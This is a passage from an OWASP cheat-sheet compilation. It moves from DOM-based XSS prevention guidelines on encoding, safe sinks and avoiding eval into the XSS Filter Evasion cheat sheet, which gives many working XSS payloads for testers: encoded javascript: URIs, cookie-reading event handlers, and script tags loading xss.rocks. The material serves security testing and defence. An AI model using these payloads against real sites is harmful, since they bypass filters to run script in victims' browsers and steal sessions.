However the opposite is the case with HTML encoding. HTML tag elements are well defined and do not support alternate representations of the same tag. So HTML encoding cannot be used to allow the developer to have alternate representations of the `<a>` tag for example.

#### HTML Encoding's Disarming Nature

In general, HTML encoding serves to castrate HTML tags which are placed in HTML and HTML attribute contexts. Working example (no HTML encoding):

```html
<a href="..." >
```

Normally encoded example (Does Not Work – DNW):

```html
&#x3c;a href=... &#x3e;
```

HTML encoded example to highlight a fundamental difference with JavaScript encoded values (DNW):

```html
<&#x61; href=...>
```

If HTML encoding followed the same semantics as JavaScript encoding, the line above could have possibly worked to render a link. This difference makes JavaScript encoding a less viable weapon in our fight against XSS.

### RULE \#4 - JavaScript Escape Before Inserting Untrusted Data into the CSS Attribute Subcontext within the Execution Context

Normally executing JavaScript from a CSS context required either passing `javascript:attackCode()` to the CSS `url()` method or invoking the CSS `expression()` method passing JavaScript code to be directly executed.

From my experience, calling the `expression()` function from an execution context (JavaScript) has been disabled. In order to mitigate against the CSS `url()` method, ensure that you are URL encoding the data passed to the CSS `url()` method.

```javascript
var ESAPI = require('node-esapi');
document.body.style.backgroundImage = "url(<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForURL(companyName))%>)";
```

### RULE \#5 - URL Escape then JavaScript Escape Before Inserting Untrusted Data into URL Attribute Subcontext within the Execution Context

The logic which parses URLs in both execution and rendering contexts looks to be the same. Therefore there is little change in the encoding rules for URL attributes in an execution (DOM) context.

```javascript
var ESAPI = require('node-esapi');
var x = document.createElement("a");
x.setAttribute("href", '<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForURL(userRelativePath))%>');
var y = document.createTextElement("Click Me To Test");
x.appendChild(y);
document.body.appendChild(x);
```

If you utilize fully qualified URLs then this will break the links as the colon in the protocol identifier (`http:` or `javascript:`) will be URL encoded preventing the `http` and `javascript` protocols from being invoked.

### RULE \#6 - Populate the DOM using safe JavaScript functions or properties

The most fundamental safe way to populate the DOM with untrusted data is to use the safe assignment property `textContent`.

Here is an example of safe usage.

```html
<script>
element.textContent = untrustedData;  //does not execute code
</script>
```

### RULE \#7 - Fixing DOM Cross-site Scripting Vulnerabilities

The best way to fix DOM based cross-site scripting is to use the right output method (sink). For example if you want to use user input to write in a `div tag` element don't use `innerHtml`, instead use `innerText` or `textContent`. This will solve the problem, and it is the right way to re-mediate DOM based XSS vulnerabilities.

**It is always a bad idea to use a user-controlled input in dangerous sources such as eval. 99% of the time it is an indication of bad or lazy programming practice, so simply don't do it instead of trying to sanitize the input.**

Finally, to fix the problem in our initial code, instead of trying to encode the output correctly which is a hassle and can easily go wrong we would simply use `element.textContent` to write it in a content like this:

```html
<b>Current URL:</b> <span id="contentholder"></span>
...
<script>
document.getElementById("contentholder").textContent = document.baseURI;
</script>
```

It does the same thing but this time it is not vulnerable to DOM based cross-site scripting vulnerabilities.

### Guidelines for Developing Secure Applications Utilizing JavaScript

DOM based XSS is extremely difficult to mitigate against because of its large attack surface and lack of standardization across browsers.

The guidelines below are an attempt to provide guidelines for developers when developing Web based JavaScript applications (Web 2.0) such that they can avoid XSS.

#### GUIDELINE \#1 - Untrusted data should only be treated as displayable text

Avoid treating untrusted data as code or markup within JavaScript code.

#### GUIDELINE \#2 - Always JavaScript encode and delimit untrusted data as quoted strings when entering the application when building templated JavaScript

Always JavaScript encode and delimit untrusted data as quoted strings when entering the application as illustrated in the following example.

```javascript
var x = "<%= Encode.forJavaScript(untrustedData) %>";
```

#### GUIDELINE \#3 - Use document.createElement("..."), element.setAttribute("...","value"), element.appendChild(...) and similar to build dynamic interfaces

`document.createElement("...")`, `element.setAttribute("...","value")`, `element.appendChild(...)` and similar are safe ways to build dynamic interfaces.

Please note, `element.setAttribute` is only safe for a limited number of attributes.

Dangerous attributes include any attribute that is a command execution context, such as `onclick` or `onblur`.

Examples of safe attributes includes: `align`, `alink`, `alt`, `bgcolor`, `border`, `cellpadding`, `cellspacing`, `class`, `color`, `cols`, `colspan`, `coords`, `dir`, `face`, `height`, `hspace`, `ismap`, `lang`, `marginheight`, `marginwidth`, `multiple`, `nohref`, `noresize`, `noshade`, `nowrap`, `ref`, `rel`, `rev`, `rows`, `rowspan`, `scrolling`, `shape`, `span`, `summary`, `tabindex`, `title`, `usemap`, `valign`, `value`, `vlink`, `vspace`, `width`.

#### GUIDELINE \#4 - Avoid sending untrusted data into HTML rendering methods

Avoid populating the following methods with untrusted data.

1. `element.innerHTML = "...";`
2. `element.outerHTML = "...";`
3. `document.write(...);`
4. `document.writeln(...);`

#### GUIDELINE \#5 - Avoid the numerous methods which implicitly eval() data passed to it

There are numerous methods which implicitly `eval()` data passed to it that must be avoided.

Make sure that any untrusted data passed to these methods is:

1. Delimited with string delimiters
2. Enclosed within a closure or JavaScript encoded to N-levels based on usage
3. Wrapped in a custom function.

Ensure to follow step 3 above to make sure that the untrusted data is not sent to dangerous methods within the custom function or handle it by adding an extra layer of encoding.

##### Utilizing an Enclosure (as suggested by Gaz)

The example that follows illustrates using closures to avoid double JavaScript encoding.

```javascript
 var ESAPI = require('node-esapi');
 setTimeout((function(param) { return function() {
          customFunction(param);
        }
 })("<%=ESAPI.encoder().encodeForJavascript(untrustedData)%>"), y);
```

The other alternative is using N-levels of encoding.

##### N-Levels of Encoding

If your code looked like the following, you would need to only double JavaScript encode input data.

```javascript
setTimeout("customFunction('<%=doubleJavaScriptEncodedData%>', y)");
function customFunction (firstName, lastName)
     alert("Hello" + firstName + " " + lastName);
}
```

The `doubleJavaScriptEncodedData` has its first layer of JavaScript encoding reversed (upon execution) in the single quotes.

Then the implicit `eval` of `setTimeout` reverses another layer of JavaScript encoding to pass the correct value to `customFunction`

The reason why you only need to double JavaScript encode is that the `customFunction` function did not itself pass the input to another method which implicitly or explicitly called `eval` If *firstName* was passed to another JavaScript method which implicitly or explicitly called `eval()` then `<%=doubleJavaScriptEncodedData%>` above would need to be changed to `<%=tripleJavaScriptEncodedData%>`.

An important implementation note is that if the JavaScript code tries to utilize the double or triple encoded data in string comparisons, the value may be interpreted as different values based on the number of `evals()` the data has passed through before being passed to the if comparison and the number of times the value was JavaScript encoded.

If **A** is double JavaScript encoded then the following **if** check will return false.

``` javascript
 var x = "doubleJavaScriptEncodedA";  //\u005c\u0075\u0030\u0030\u0034\u0031
 if (x == "A") {
    alert("x is A");
 } else if (x == "\u0041") {
    alert("This is what pops");
 }
```

This brings up an interesting design point. Ideally, the correct way to apply encoding and avoid the problem stated above is to server-side encode for the output context where data is introduced into the application.

Then client-side encode (using a JavaScript encoding library such as [node-esapi](https://github.com/ESAPI/node-esapi/)) for the individual subcontext (DOM methods) which untrusted data is passed to.

Here are some examples of how they are used:

```javascript
//server-side encoding
var ESAPI = require('node-esapi');
var input = "<%=ESAPI.encoder().encodeForJavascript(untrustedData)%>";
```

```javascript
//HTML encoding is happening in JavaScript
var ESAPI = require('node-esapi');
document.writeln(ESAPI.encoder().encodeForHTML(input));
```

One option is utilize ECMAScript 5 immutable properties in the JavaScript library.
Another option provided by Gaz (Gareth) was to use a specific code construct to limit mutability with anonymous closures.

An example follows:

```javascript
function escapeHTML(str) {
     str = str + "''";
     var out = "''";
     for(var i=0; i<str.length; i++) {
         if(str[i] === '<') {
             out += '&lt;';
         } else if(str[i] === '>') {
             out += '&gt;';
         } else if(str[i] === "'") {
             out += '&#39;';
         } else if(str[i] === '"') {
             out += '&quot;';
         } else {
             out += str[i];
         }
     }
     return out;
}
```

#### GUIDELINE \#6 - Use untrusted data on only the right side of an expression

Use untrusted data on only the right side of an expression, especially data that looks like code and may be passed to the application (e.g., `location` and `eval()`).

```javascript
window[userDataOnLeftSide] = "userDataOnRightSide";
```

Using untrusted user data on the left side of the expression allows an attacker to subvert internal and external attributes of the window object, whereas using user input on the right side of the expression doesn't allow direct manipulation.

#### GUIDELINE \#7 - When URL encoding in DOM be aware of character set issues

When URL encoding in DOM be aware of character set issues as the character set in JavaScript DOM is not clearly defined (Mike Samuel).

#### GUIDELINE \#8 - Limit access to object properties when using object\[x\] accessors

Limit access to object properties when using `object[x]` accessors (Mike Samuel). In other words, add a level of indirection between untrusted input and specified object properties.

Here is an example of the problem using map types:

```javascript
var myMapType = {};
myMapType[<%=untrustedData%>] = "moreUntrustedData";
```

The developer writing the code above was trying to add additional keyed elements to the `myMapType` object. However, this could be used by an attacker to subvert internal and external attributes of the `myMapType` object.

A better approach would be to use the following:

```javascript
if (untrustedData === 'location') {
  myMapType.location = "moreUntrustedData";
}
```

#### GUIDELINE \#9 - Keep HTML sanitization separate from JavaScript execution

Use an HTML sanitizer such as [DOMPurify](https://github.com/cure53/DOMPurify#what-does-it-do) when the application must render untrusted markup; see the [HTML sanitization guidance](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-sanitization). HTML sanitizers filter markup and do not provide a sandbox for executing arbitrary JavaScript. Do not pass untrusted code to [`eval()` or `Function()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_direct_eval!).

#### GUIDELINE \#10 - Don't eval() JSON to convert it to native JavaScript objects

Don't `eval()` JSON to convert it to native JavaScript objects. Use the built-in `JSON.parse()` to deserialize JSON into JavaScript values, and `JSON.stringify()` to serialize JavaScript values into JSON. `JSON.parse()` rejects anything that is not valid JSON, so it cannot execute attacker-supplied code the way `eval()` can.

> **Warning:**
> `JSON.stringify()` is **not** an output-encoding function. Its output is valid JSON, but embedding it in HTML requires protection for the destination context. Prefer a separate response with `Content-Type: application/json`, parsed client-side with `JSON.parse()`. If JSON must be embedded in an inline script, use a serializer or encoder documented for that exact placement, protecting both JavaScript syntax and the [enclosing HTML script context](https://html.spec.whatwg.org/multipage/scripting.html#restrictions-for-contents-of-script-elements), including literal `</script` sequences. HTML entity encoding or JavaScript quote escaping alone is not sufficient for this placement. For other placements, follow the [context-specific XSS encoding rules](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding).

### Common Problems Associated with Mitigating DOM Based XSS

#### Complex Contexts

In many cases the context isn't always straightforward to discern.

```html
<a href="javascript:myFunction('<%=untrustedData%>', 'test');">Click Me</a>
 ...
<script>
Function myFunction (url,name) {
    window.location = url;
}
</script>
```

In the above example, untrusted data started in the rendering URL context (`href` attribute of an `a` tag) then changed to a JavaScript execution context (`javascript:` protocol handler) which passed the untrusted data to an execution URL subcontext (`window.location` of `myFunction`).

Because the data was introduced in JavaScript code and passed to a URL subcontext the appropriate server-side encoding would be the following:

```html
<a href="javascript:myFunction('<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForURL(untrustedData)) %>', 'test');">
Click Me</a>
 ...
```

Or if you were using ECMAScript 5 with an immutable JavaScript client-side encoding libraries you could do the following:

```html
<!-- server side URL encoding has been removed.  Now only JavaScript encoding on server side. -->
<a href="javascript:myFunction('<%=ESAPI.encoder().encodeForJavascript(untrustedData)%>', 'test');">Click Me</a>
 ...
<script>
Function myFunction (url,name) {
    var encodedURL = ESAPI.encoder().encodeForURL(url);  //URL encoding using client-side scripts
    window.location = encodedURL;
}
</script>
```

#### Inconsistencies of Encoding Libraries

There are a number of open source encoding libraries out there:

1. OWASP [ESAPI](https://owasp.org/www-project-enterprise-security-api/)
2. OWASP [Java Encoder](https://owasp.org/www-project-java-encoder/)
3. Apache Commons Text [StringEscapeUtils](https://commons.apache.org/proper/commons-text/javadocs/api-release/org/apache/commons/text/StringEscapeUtils.html), replace one from [Apache Commons Lang3](https://commons.apache.org/proper/commons-lang/apidocs/org/apache/commons/lang3/StringEscapeUtils.html)
4. [Jtidy](http://jtidy.sourceforge.net/)
5. Your company's custom implementation.

Some work on a denylist while others ignore important characters like "&lt;" and "&gt;".

Java Encoder is an active project providing supports for HTML, CSS and JavaScript encoding.

ESAPI is one of the few which works on an allowlist and encodes all non-alphanumeric characters. It is important to use an encoding library that understands which characters can be used to exploit vulnerabilities in their respective contexts. Misconceptions abound related to the proper encoding that is required.

#### Encoding Misconceptions

Many security training curriculums and papers advocate the blind usage of HTML encoding to resolve XSS.

This logically seems to be prudent advice as the JavaScript parser does not understand HTML encoding.

However, if the pages returned from your web application utilize a content type of `text/xhtml` or the file type extension of `*.xhtml` then HTML encoding may not work to mitigate against XSS.

For example:

```html
<script>
&#x61;lert(1);
</script>
```

The HTML encoded value above is still executable. If that isn't enough to keep in mind, you have to remember that encodings are lost when you retrieve them using the value attribute of a DOM element.

Let's look at the sample page and script:

```html
<form name="myForm" ...>
  <input type="text" name="lName" value="<%=ESAPI.encoder().encodeForHTML(last_name)%>">
 ...
</form>
<script>
  var x = document.myForm.lName.value;  //when the value is retrieved the encoding is reversed
  document.writeln(x);  //any code passed into lName is now executable.
</script>
```

Finally there is the problem that certain methods in JavaScript which are usually safe can be unsafe in certain contexts.

#### Usually Safe Methods

One example of an attribute which is thought to be safe is `innerText`.

Some papers or guides advocate its use as an alternative to `innerHTML` to mitigate against XSS in `innerHTML`. However, depending on the tag which `innerText` is applied, code can be executed.

```html
<script>
 var tag = document.createElement("script");
 tag.innerText = "<%=untrustedData%>";  //executes code
</script>
```

The `innerText` feature was originally introduced by Internet Explorer, and was formally specified in the HTML standard in 2016 after being adopted by all major browser vendors.

#### Detect DOM XSS using variant analysis

**Vulnerable code:**

```
<script>
var x = location.hash.split("#")[1];
document.write(x);
</script>
```

Semgrep rule to identify above dom xss [link](https://semgrep.dev/s/we30).

## XSS Filter Evasion

> **Source:** [XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

This article is a guide to Cross Site Scripting (XSS) testing for application security professionals. This cheat sheet was originally based on RSnake's seminal XSS Cheat Sheet previously at: `http://ha.ckers.org/xss.html`. Now, the OWASP Cheat Sheet Series provides users with an updated and maintained version of the document. The very first OWASP Cheat Sheet, [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), was inspired by RSnake's work and we thank RSnake for the inspiration!

### Tests

This cheat sheet demonstrates that input filtering is an incomplete defense for XSS by supplying testers with a series of XSS attacks that can bypass certain XSS defensive filters.

#### Basic XSS Test Without Filter Evasion

For this baseline test, host a script containing only `alert('XSS')` on an HTTPS endpoint you control. Replace the placeholder URL below with that script's URL:

```html
<SCRIPT SRC=https://example.com/xss-test.js></SCRIPT>
```

Use a script you have reviewed and control: [external scripts execute in the context of the tested page](https://developer.mozilla.org/en-US/docs/Web/API/HTMLScriptElement/src#security_considerations). A mutable third-party script can change what runs during your test.

#### XSS Locator (Polyglot)

This test delivers a 'polyglot test XSS payload' that executes in multiple contexts, including HTML, script strings, JavaScript, and URLs:

```js
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```

(Based on this [tweet](https://twitter.com/garethheyes/status/997466212190781445) by [Gareth Heyes](https://twitter.com/garethheyes)).

#### Malformed A Tags

This test skips the [`href`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href) attribute to demonstrate an XSS attack using event handlers:

```js
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
```

Chrome automatically inserts missing quotes for you. If you encounter issues, try omitting them and Chrome will correctly place the missing quotes in URLs or scripts for you:

```js
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```

(Submitted by David Cross, Verified on Chrome)

#### Malformed IMG Tags

This XSS method uses the relaxed rendering engine to create an XSS vector within an IMG tag (which needs to be encapsulated within quotes). We believe this approach was originally meant to correct sloppy coding and it would also make it significantly more difficult to correctly parse HTML tags:

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```

(Originally found by Begeek, but it was cleaned up and shortened to work in all browsers)

#### fromCharCode

If the system does not allow quotes of any kind, you can `eval()` a `fromCharCode` in JavaScript to create any XSS vector you need:

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
```

#### Default SRC Tag to Get Past Filters that Check SRC Domain

This attack will bypass most SRC domain filters. Inserting JavaScript in an event handler also applies to any HTML tag type injection using elements like Form, Iframe, Input, Embed, etc. This also allows the substitution of any relevant event for the tag type, such as `onblur` or `onclick`, providing extensive variations of the injections listed here:

```html
<IMG SRC=# onmouseover="alert('xxs')">
```

(Submitted by David Cross and edited by Abdullah Hussam)

#### Default SRC Tag by Leaving it Empty

```html
<IMG SRC= onmouseover="alert('xxs')">
```

#### Default SRC Tag by Leaving it out Entirely

```html
<IMG onmouseover="alert('xxs')">
```

#### On Error Alert

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

#### IMG onerror and JavaScript Alert Encode

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

#### Decimal HTML Character References

Since XSS examples that use a `javascript:` directive inside an `<IMG` tag do not work on Firefox this approach uses decimal HTML character references as a workaround:

```html

 <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
```

#### Decimal HTML Character References Without Trailing Semicolons

This is often effective in bypassing XSS filters that look for the string `&\#XX;`, since most people don't know about padding - which can be used up to 7 numeric characters total. This is also useful against filters that decode against strings like `$tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/;` which incorrectly assumes a semicolon is required to terminate a HTML encoded string (This has been seen in the wild):

```html
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
```

#### Hexadecimal HTML Character References Without Trailing Semicolons

This attack is also viable against the filter for the string `$tmp\_string=\~ s/.\*\\&\#(\\d+);.\*/$1/;`, because it assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters:

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
```

#### Embedded Tab

This approach breaks up the XSS attack:

<!-- markdownlint-disable MD010-->
```html
 <a href="jav	ascript:alert('XSS');">Click Me</a>
```
<!-- markdownlint-enable MD010-->

#### Embedded Encoded Tab

This approach can also break up XSS:

```html
 <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
```

#### Embedded Newline to Break Up XSS

While some defenders claim that any of the chars 09-13 (decimal) will work for this attack, this is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. Examine the [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) for reference. The next four XSS attack examples illustrate this vector:

```html
<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
```

##### Example 1: Break Up XSS Attack with Embedded Carriage Return

(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):

```html
<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
```

##### Example 2: Break Up JavaScript Directive with Null

Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use `%00` in the URL string or if you want to write your own injection tool you can either use vim (`^V^@` will produce a null) or the following program to generate it into a text file. The null char `%00` is much more useful and helped me bypass certain real world filters with a variation on this example:

```sh
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```

##### Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS

This is useful if a filter's pattern match doesn't take into account spaces in the word `javascript:`, which is correct since that won't render, but makes the false assumption that you can't have a space between the quote and the `javascript:` keyword. The actual reality is you can have any char from 1-32 in decimal:

```html
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```

##### Example 4: Non-alpha-non-digit XSS

The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example `\<SCRIPT\\s` != `\<SCRIPT/XSS\\s`:

```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```

Based on the same idea as above, however, expanded on it, using Rsnake's fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```

Yair Amit noted that there is a slightly different behavior between the Trident (IE) and Gecko (Firefox) rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful in a attack if the system does not allow spaces:

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```

#### Extraneous Open Brackets

This XSS vector could defeat certain detection engines that work by checking matching pairs of open and close angle brackets then comparing the tag inside, instead of a more efficient algorithm like [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to suppress a JavaScript error:

```html
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```

(Submitted by Franz Sedlmaier)

#### No Closing Script Tags

With Firefox, you don't actually need the `\></SCRIPT>` portion of this XSS vector, because Firefox assumes it's safe to close the HTML tag and adds closing tags for you. Unlike the next attack, which doesn't affect Firefox, this method does not require any additional HTML below it. You can add quotes if you need to, but they're normally not needed:

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```

#### Protocol Resolution in Script Tags

This particular variant is partially based on Ozh's protocol resolution bypass below, and it works in IE and Edge in compatibility mode. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The `.j` is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag:

```html
<SCRIPT SRC=//xss.rocks/.j>
```

(Submitted by Łukasz Pilorz)

#### Half Open HTML/JavaScript XSS Vector

Unlike Firefox, the IE rendering engine (Trident) doesn't add extra data to your page, but it does allow the `javascript:` directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this XSS vector. Even though there is no close `\>` tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following network intrusion detection system (NIDS) regex: `/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/` because it doesn't require the end `\>`. As a side note, this was also affective against a real world XSS filter using an open ended `<IFRAME` tag instead of an `<IMG` tag.

```html
<IMG SRC="`<javascript:alert>`('XSS')"
```

#### Escaping JavaScript Escapes

If an application is written to output some user information inside of a JavaScript (like the following: `<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>`) and you want to inject your own JavaScript into it but the server side application escapes certain quotes, you can circumvent that by escaping their escape character. When this gets injected it will read `<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>` which ends up un-escaping the double quote and causing the XSS vector to fire. The XSS locator uses this method:

```js
\";alert('XSS');//
```

An alternative, if correct JSON or JavaScript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:

```js
</script><script>alert('XSS');</script>
```

#### End Title Tag

This is a simple XSS vector that closes `<TITLE>` tags, which can encapsulate the malicious cross site scripting attack:

```html
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```

##### INPUT Image

```html
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```

##### BODY Image

```html
<BODY BACKGROUND="javascript:alert('XSS')">
```

##### IMG Dynsrc

```html
<IMG DYNSRC="javascript:alert('XSS')">
```

##### IMG Lowsrc

```html
<IMG LOWSRC="javascript:alert('XSS')">
```

#### List-style-image

This esoteric attack focuses on embedding images for bulleted lists. It will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful XSS vector:

```html
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```

#### VBscript in an Image

```html
<IMG SRC='vbscript:msgbox("XSS")'>
```

#### SVG Object Tag

```js
<svg/onload=alert('XSS')>
```

#### ECMAScript 6

```js
Set.constructor`alert\x28document.domain\x29
```

#### BODY Tag

This attack doesn't require using any variants of `javascript:` or `<SCRIPT...` to accomplish the XSS attack. Dan Crowley has noted that you can put a space before the equals sign (`onload=` != `onload =`):

```html
<BODY ONLOAD=alert('XSS')>
```

##### Attacks Using Event Handlers

The attack with the BODY tag can be modified for use in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.

The [Dottoro Web Reference](http://help.dottoro.com/) also has a nice [list of events in JavaScript](http://help.dottoro.com/ljfvvdnm.php).

- `onAbort()` (when user aborts the loading of an image)
- `onActivate()` (when object is set as the active element)
- `onAfterPrint()` (activates after user prints or previews print job)
- `onAfterUpdate()` (activates on data object after updating data in the source object)
- `onBeforeActivate()` (fires before the object is set as the active element)
- `onBeforeCopy()` (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the `execCommand("Copy")` function)
- `onBeforeCut()` (attacker executes the attack string right before a selection is cut)
- `onBeforeDeactivate()` (fires right after the activeElement is changed from the current object)
- `onBeforeEditFocus()` (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
- `onBeforePaste()` (user needs to be tricked into pasting or be forced into it using the `execCommand("Paste")` function)
- `onBeforePrint()` (user would need to be tricked into printing or attacker could use the `print()` or `execCommand("Print")` function).
- `onBeforeUnload()` (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
- `onBeforeUpdate()` (activates on data object before updating data in the source object)
- `onBegin()` (the onbegin event fires immediately when the element's timeline begins)
- `onBlur()` (in the case where another popup is loaded and window looses focus)
- `onBounce()` (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)
- `onCellChange()` (fires when data changes in the data provider)
- `onChange()` (select, text, or TEXTAREA field loses focus and its value has been modified)
- `onClick()` (someone clicks on a form)
- `onContextMenu()` (user would need to right click on attack area)
- `onControlSelect()` (fires when the user is about to make a control selection of the object)
- `onCopy()` (user needs to copy something or it can be exploited using the `execCommand("Copy")` command)
- `onCut()` (user needs to copy something or it can be exploited using the `execCommand("Cut")` command)
- `onDataAvailable()` (user would need to change data in an element, or attacker could perform the same function)
- `onDataSetChanged()` (fires when the data set exposed by a data source object changes)
- `onDataSetComplete()` (fires to indicate that all data is available from the data source object)
- `onDblClick()` (user double-clicks a form element or a link)
- `onDeactivate()` (fires when the activeElement is changed from the current object to another object in the parent document)
- `onDrag()` (requires that the user drags an object)
- `onDragEnd()` (requires that the user drags an object)
- `onDragLeave()` (requires that the user drags an object off a valid location)
- `onDragEnter()` (requires that the user drags an object into a valid location)
- `onDragOver()` (requires that the user drags an object into a valid location)
- `onDragDrop()` (user drops an object (e.g. file) onto the browser window)
- `onDragStart()` (occurs when user starts drag operation)
- `onDrop()` (user drops an object (e.g. file) onto the browser window)
- `onEnd()` (the onEnd event fires when the timeline ends.
- `onError()` (loading of a document or image causes an error)
- `onErrorUpdate()` (fires on a data bound object when an error occurs while updating the associated data in the data source object)
- `onFilterChange()` (fires when a visual filter completes state change)
- `onFinish()` (attacker can create the exploit when marquee is finished looping)
- `onFocus()` (attacker executes the attack string when the window gets focus)
- `onFocusIn()` (attacker executes the attack string when window gets focus)
- `onFocusOut()` (attacker executes the attack string when window looses focus)
- `onHashChange()` (fires when the fragment identifier part of the document's current address changed)
- `onHelp()` (attacker executes the attack string when users hits F1 while the window is in focus)
- `onInput()` (the text content of an element is changed through the user interface)
- `onKeyDown()` (user depresses a key)
- `onKeyPress()` (user presses or holds down a key)
- `onKeyUp()` (user releases a key)
- `onLayoutComplete()` (user would have to print or print preview)
- `onLoad()` (attacker executes the attack string after the window loads)
- `onLoseCapture()` (can be exploited by the `releaseCapture()` method)
- `onMediaComplete()` (When a streaming media file is used, this event could fire before the file starts playing)
- `onMediaError()` (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
- `onMessage()` (fire when the document received a message)
- `onMouseDown()` (the attacker would need to get the user to click on an image)
- `onMouseEnter()` (cursor moves over an object or area)
- `onMouseLeave()` (the attacker would need to get the user to mouse over an image or table and then off again)
- `onMouseMove()` (the attacker would need to get the user to mouse over an image or table)
- `onMouseOut()` (the attacker would need to get the user to mouse over an image or table and then off again)
- `onMouseOver()` (cursor moves over an object or area)
- `onMouseUp()` (the attacker would need to get the user to click on an image)
- `onMouseWheel()` (the attacker would need to get the user to use their mouse wheel)
- `onMove()` (user or attacker would move the page)
- `onMoveEnd()` (user or attacker would move the page)
- `onMoveStart()` (user or attacker would move the page)
- `onOffline()` (occurs if the browser is working in online mode and it starts to work offline)
- `onOnline()` (occurs if the browser is working in offline mode and it starts to work online)
- `onOutOfSync()` (interrupt the element's ability to play its media as defined by the timeline)
- `onPaste()` (user would need to paste or attacker could use the `execCommand("Paste")` function)
- `onPause()` (the onpause event fires on every element that is active when the timeline pauses, including the body element)
- `onPopState()` (fires when user navigated the session history)
- `onPropertyChange()` (user or attacker would need to change an element property)
- `onReadyStateChange()` (user or attacker would need to change an element property)
- `onRedo()` (user went forward in undo transaction history)
- `onRepeat()` (the event fires once for each repetition of the timeline, excluding the first full cycle)
- `onReset()` (user or attacker resets a form)
- `onResize()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
